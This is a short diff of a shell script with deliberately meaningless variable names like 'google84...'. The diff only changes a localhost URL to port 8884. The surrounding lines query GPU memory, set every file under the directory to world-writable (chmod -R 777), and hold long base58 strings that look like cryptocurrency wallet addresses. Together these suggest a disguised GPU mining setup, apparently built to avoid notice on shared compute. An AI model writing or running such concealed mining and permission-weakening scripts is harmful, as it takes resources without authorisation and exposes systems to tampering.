@@ -13,7 +13,7 @@ do
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-google841212121274="http://localhost"
+google841212121274="http://localhost:8884"
 
 arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
 arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
@@ -30,7 +30,7 @@ chmod -R 777 ./
 
 cd /mnt/disks/user/project/
 
-google841212121274="http://localhost"
+google841212121274="http://localhost:8884"
 
 google84="26884"
 
@@ -61,7 +61,7 @@ else
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-google841212121274="http://localhost"
+google841212121274="http://localhost:8884"
 
 google84121212121212121274="4migato2bH4mdWUVMWTrUC49bCGARNnqR1YAteUJ3tEJVobjrooSa6NqK2Uwehu9WFtpLwwEmcwT63Xcphun1bwj"
 
